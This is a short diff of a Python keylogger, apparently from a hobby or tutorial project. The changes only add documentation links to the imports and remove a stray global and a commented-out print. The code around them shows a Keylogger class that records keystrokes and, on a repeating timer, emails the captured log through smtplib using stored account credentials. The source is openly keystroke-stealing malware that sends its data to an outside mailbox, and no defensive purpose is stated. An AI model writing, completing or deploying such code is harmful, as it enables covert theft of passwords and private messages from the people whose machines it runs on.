@@ -1,11 +1,8 @@
 #!/usr/bin/env python3
 
-import pynput.keyboard
-import smtplib
-import threading
-
-
-log = ""
+import pynput.keyboard  # https://pynput.readthedocs.io/en/latest/index.html
+import smtplib  # https://docs.python.org/3/library/smtplib.html
+import threading  # https://docs.python.org/3/library/threading.html
 
 
 class Keylogger:
@@ -29,7 +26,6 @@ class Keylogger:
         self.append_to_log(current_key)
 
     def report(self):
-        # print (self.log)
         self.send_mail(self.email, self.password, "\n\n" + self.log)
         self.log = ""
         timer = threading.Timer(self.interval, self.report)
